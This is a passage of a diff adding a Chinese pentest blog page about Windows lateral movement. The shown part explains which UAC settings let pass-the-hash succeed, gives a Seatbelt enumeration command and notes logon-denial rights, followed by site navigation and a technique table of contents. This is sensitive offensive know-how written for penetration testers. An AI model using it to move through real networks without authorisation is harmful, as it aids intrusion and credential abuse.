+<td align="left">N&#x2F;A</td>
+<td align="left">N&#x2F;A</td>
+<td align="left">PtH可以在本地Administrator组和RID500的账户下生效</td>
+</tr>
+<tr>
+<td align="left">1</td>
+<td align="left">0 (default)</td>
+<td align="left">0 (default)</td>
+<td align="left">只能对RID为500的默认账户使用PtH</td>
+</tr>
+<tr>
+<td align="left">1</td>
+<td align="left">0</td>
+<td align="left">1</td>
+<td align="left">无法使用PtH</td>
+</tr>
+<tr>
+<td align="left">1</td>
+<td align="left">1</td>
+<td align="left">0</td>
+<td align="left">可以对任意本地admin组用户使用PtH</td>
+</tr>
+</tbody></table>
+<p>UAC设置可以本地或通过GPO进行配置<br>在本地系统中可以使用<code>Seatbelt</code>工具枚举UAC设置<br><code>Seatbelt.exe UACSystemPolicies</code><br>想要枚举使用GPO配置的UAC设置，可以使用PowerView的工具</p>
+<p>windows有另一系列的设置以阻止我们横向移动，比如URA，用户权限分配。<br>URA是当用户登录到系统是分配权限的设置，我们重点关注两个权限:</p>
+<ul>
+<li><code>SeDenyNetworkLogonRight</code>禁止远程登录</li>
+<li><code>SeDenyRemoteInteractiveLogonRight</code>禁止用户远程桌面登录</li>
+</ul>
+<h3 id="Overpass-the-Hash"><a href="#Overpass-the-Hash" class="headerlink" title="Overpass-the-Hash"></a>Overpass-the-Hash</h3><h3 id="Pass-the-Ticket"><a href="#Pass-the-Ticket" class="headerlink" title="Pass-the-Ticket"></a>Pass-the-Ticket</h3><p>详见mimikatz</p>
+<h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><p><a target="_blank" rel="external nofollow noopener noreferrer" href="https://riccardoancarani.github.io/2019-10-04-lateral-movement-megaprimer/">Lateral Movement</a><br><a target="_blank" rel="external nofollow noopener noreferrer" href="https://www.chabug.org/tools/755.html">Cobalt Strike 几种不常见的上线方式</a><br><a target="_blank" rel="external nofollow noopener noreferrer" href="https://adamtheautomator.com/psexec/">Psexec: The Ultimate Guide</a><br><a target="_blank" rel="external nofollow noopener noreferrer" href="https://www.cybereason.com/blog/dcom-lateral-movement-techniques">New lateral movement techniques abuse DCOM technology</a><br><a target="_blank" rel="external nofollow noopener noreferrer" href="https://www.securify.nl/blog/living-off-the-land-stealing-netntlm-hashes">LIVING OFF THE LAND: STEALING NETNTLM HASHES</a></p>
+
+    </div>
+
+    
+    
+    
+
+      <footer class="post-footer">
+          <div class="post-tags">
+              <a href="/tags/pentest/" rel="tag"># pentest</a>
+          </div>
+
+        
+
+
+        
+    <div class="post-nav">
+      <div class="post-nav-item">
+    <a href="/%5BUnionCTF2021%5DCr0wnAir.html" rel="prev" title="[UnionCTF2021]Cr0wnAir">
+      <i class="fa fa-chevron-left"></i> [UnionCTF2021]Cr0wnAir
+    </a></div>
+      <div class="post-nav-item">
+    <a href="/%5BD3CTF%5D%E8%AE%B0%E5%BD%95.html" rel="next" title="[D3CTF2021]记录">
+      [D3CTF2021]记录 <i class="fa fa-chevron-right"></i>
+    </a></div>
+    </div>
+      </footer>
+    
+  </article>
+  
+  
+  
+
+
+
+          </div>
+          
+    <div class="comments" id="valine-comments"></div>
+
+<script>
+  window.addEventListener('tabs:register', () => {
+    let { activeClass } = CONFIG.comments;
+    if (CONFIG.comments.storage) {
+      activeClass = localStorage.getItem('comments_active') || activeClass;
+    }
+    if (activeClass) {
+      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
+      if (activeTab) {
+        activeTab.click();
+      }
+    }
+  });
+  if (CONFIG.comments.storage) {
+    window.addEventListener('tabs:click', event => {
+      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
+      let commentClass = event.target.classList[1];
+      localStorage.setItem('comments_active', commentClass);
+    });
+  }
+</script>
+
+        </div>
+          
+  
+  <div class="toggle sidebar-toggle">
+    <span class="toggle-line toggle-line-first"></span>
+    <span class="toggle-line toggle-line-middle"></span>
+    <span class="toggle-line toggle-line-last"></span>
+  </div>
+
+  <aside class="sidebar">
+    <div class="sidebar-inner">
+
+      <ul class="sidebar-nav motion-element">
+        <li class="sidebar-nav-toc">
+          文章目录
+        </li>
+        <li class="sidebar-nav-overview">
+          站点概览
+        </li>
+      </ul>
+
+      <!--noindex-->
+      <div class="post-toc-wrap sidebar-panel">
+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8"><span class="nav-number">1.</span> <span class="nav-text">横向移动</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%AF%BB%E6%89%BE%E6%8B%A5%E6%9C%89%E8%AE%BF%E9%97%AE%E6%9D%83%E9%99%90%E7%9A%84%E5%9C%B0%E6%96%B9"><span class="nav-number">1.1.</span> <span class="nav-text">寻找拥有访问权限的地方</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%9C%AC%E5%9C%B0%E7%BB%84%E6%88%90%E5%91%98-%E7%9B%B2%E6%8E%A5%E8%A7%A6"><span class="nav-number">1.1.1.</span> <span class="nav-text">本地组成员-盲接触</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%9C%AC%E5%9C%B0%E7%BB%84%E6%88%90%E5%91%98-%E7%BB%84%E7%AD%96%E7%95%A5%E5%AF%B9%E8%B1%A1"><span class="nav-number">1.1.2.</span> <span class="nav-text">本地组成员-组策略对象</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E8%AE%BF%E9%97%AE%E5%85%B1%E4%BA%AB%E6%96%87%E4%BB%B6"><span class="nav-number">1.1.3.</span> <span class="nav-text">访问共享文件</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E8%AE%BF%E9%97%AE%E6%8E%A7%E5%88%B6%E5%88%97%E8%A1%A8-ACL"><span class="nav-number">1.1.4.</span> <span class="nav-text">访问控制列表(ACL)</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#MSSQL%E8%AE%BF%E9%97%AE"><span class="nav-number">1.1.5.</span> <span class="nav-text">MSSQL访问</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#WMI"><span class="nav-number">1.2.</span> <span class="nav-text">WMI</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E8%BF%9C%E7%A8%8B%E6%9C%8D%E5%8A%A1%E5%88%9B%E5%BB%BA"><span class="nav-number">1.3.</span> <span class="nav-text">远程服务创建</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E8%BF%9C%E7%A8%8B%E6%A1%8C%E9%9D%A2%E5%8D%8F%E8%AE%AE"><span class="nav-number">1.4.</span> <span class="nav-text">远程桌面协议</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E8%BF%9C%E7%A8%8BPowerShell"><span class="nav-number">1.5.</span> <span class="nav-text">远程PowerShell</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E4%BB%BB%E5%8A%A1%E7%AE%A1%E7%90%86%E5%99%A8"><span class="nav-number">1.6.</span> <span class="nav-text">任务管理器</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#PsExec"><span class="nav-number">1.7.</span> <span class="nav-text">PsExec</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%89%8D%E7%BD%AE%E7%9F%A5%E8%AF%86"><span class="nav-number">1.7.1.</span> <span class="nav-text">前置知识</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%88%A9%E7%94%A8"><span class="nav-number">1.7.2.</span> <span class="nav-text">利用</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#DCOM"><span class="nav-number">1.8.</span> <span class="nav-text">DCOM</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%AF%86%E7%A0%81%E5%96%B7%E5%B0%84"><span class="nav-number">1.9.</span> <span class="nav-text">密码喷射</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%96%87%E4%BB%B6%E5%A4%B9%E9%87%8D%E5%AE%9A%E5%90%91%E5%92%8C%E6%BC%AB%E6%B8%B8%E9%85%8D%E7%BD%AE%E6%96%87%E4%BB%B6"><span class="nav-number">1.10.</span> <span class="nav-text">文件夹重定向和漫游配置文件</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#RDP%E5%8A%AB%E6%8C%81"><span class="nav-number">1.11.</span> <span class="nav-text">RDP劫持</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Pass-the-Hash"><span class="nav-number">1.12.</span> <span class="nav-text">Pass-the-Hash</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#mimikatz"><span class="nav-number">1.12.1.</span> <span class="nav-text">mimikatz</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Impacket"><span class="nav-number">1.12.2.</span> <span class="nav-text">Impacket</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#xfreerdp"><span class="nav-number">1.12.3.</span> <span class="nav-text">xfreerdp</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E7%94%A8%E6%88%B7%E8%B4%A6%E6%88%B7%E6%8E%A7%E5%88%B6-amp-%E7%94%A8%E6%88%B7%E6%9D%83%E9%99%90%E5%88%86%E9%85%8D"><span class="nav-number">1.12.4.</span> <span class="nav-text">用户账户控制&amp;用户权限分配</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Overpass-the-Hash"><span class="nav-number">1.12.5.</span> <span class="nav-text">Overpass-the-Hash</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Pass-the-Ticket"><span class="nav-number">1.12.6.</span> <span class="nav-text">Pass-the-Ticket</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%8F%82%E8%80%83%E9%93%BE%E6%8E%A5"><span class="nav-number">1.13.</span> <span class="nav-text">参考链接</span></a></li></ol></li></ol></div>
+      </div>
+      <!--/noindex-->
+
+      <div class="site-overview-wrap sidebar-panel">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+    <img class="site-author-image" itemprop="image" alt="Z3ratu1" src="https://q2.qlogo.cn/headimg_dl?dst_uin=1207039417&spec=160">
+  <p class="site-author-name" itemprop="name">Z3ratu1</p>
+  <div class="site-description" itemprop="description">与其感慨路难行，不如现在出发</div>
+</div>
+<div class="site-state-wrap motion-element">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+          <a href="/archives/">
+        
+          <span class="site-state-item-count">145</span>
+          <span class="site-state-item-name">日志</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-categories">
+            <a href="/categories/">
+          
+        <span class="site-state-item-count">5</span>
+        <span class="site-state-item-name">分类</span></a>
+      </div>
+      <div class="site-state-item site-state-tags">
+            <a href="/tags/">
+          
+        <span class="site-state-item-count">86</span>
+        <span class="site-state-item-name">标签</span></a>
+      </div>
+  </nav>
+</div>
+
+
+
+      </div>
+
+    </div>
+  </aside>
+  <div id="sidebar-dimmer"></div>
+
+
+      </div>
+    </main>
+
+    <footer class="footer">
+      <div class="footer-inner">
+        
+
+        
+  <div class="beian"><a href="http://www.beian.miit.gov.cn/" rel="external nofollow noopener noreferrer" target="_blank">湘ICP备2020021580号 </a>
+      <img src="/./images/beian.png" style="display: inline-block;">
+  </div>
+
+<div class="copyright">
+  
+  &copy; 2019 – 
+  <span itemprop="copyrightYear">2022</span>
+  <span class="with-love">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">Z3ratu1</span>
+</div>
+  <div class="powered-by">由 <a href="https://hexo.io/" class="theme-link" rel="external nofollow noopener noreferrer" target="_blank">Hexo</a> & <a href="https://pisces.theme-next.org/" class="theme-link" rel="external nofollow noopener noreferrer" target="_blank">NexT.Pisces</a> 强力驱动
+  </div>
+
+        
+
+
+
+
+
+
+
+
+      </div>
+    </footer>
+  </div>
+
+  
+  <script src="/lib/anime.min.js"></script>
+  <script src="/lib/velocity/velocity.min.js"></script>
+  <script src="/lib/velocity/velocity.ui.min.js"></script>
+
+<script src="/js/utils.js"></script>
+
+<script src="/js/motion.js"></script>
+
+
+<script src="/js/schemes/pisces.js"></script>
+
+
+<script src="/js/next-boot.js"></script>
+
+
+
+
+  
+
+
+
+
+  
+<script src="/js/local-search.js"></script>
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+  
+
+
+<script>
+NexT.utils.loadComments(document.querySelector('#valine-comments'), () => {
+  NexT.utils.getScript('https://cdn.jsdelivr.net/npm/valine@1.4.14/dist/Valine.min.js', () => {
+    var GUEST = ['nick', 'mail', 'link'];
+    var guest = 'nick,mail,link';
+    guest = guest.split(',').filter(item => {
+      return GUEST.includes(item);
+    });
+    new Valine({
+      el         : '#valine-comments',
+      verify     : false,
+      notify     : false,
+      appId      : '7H8kg0XdWO8IbhOcu4K1JaAT-gzGzoHsz',
+      appKey     : 'wPKQjkbVtvPaRR7gh2yjfLSi',
+      placeholder: "Just go go",
+      avatar     : 'mm',
+      meta       : guest,
+      pageSize   : '10' || 10,
+      visitor    : true,
+      lang       : '' || 'zh-cn',
+      path       : location.pathname,
+      recordIP   : false,
+      serverURLs : ''
+    });
+  }, window.Valine);
+});
+</script>
+
+</body>
+</html>
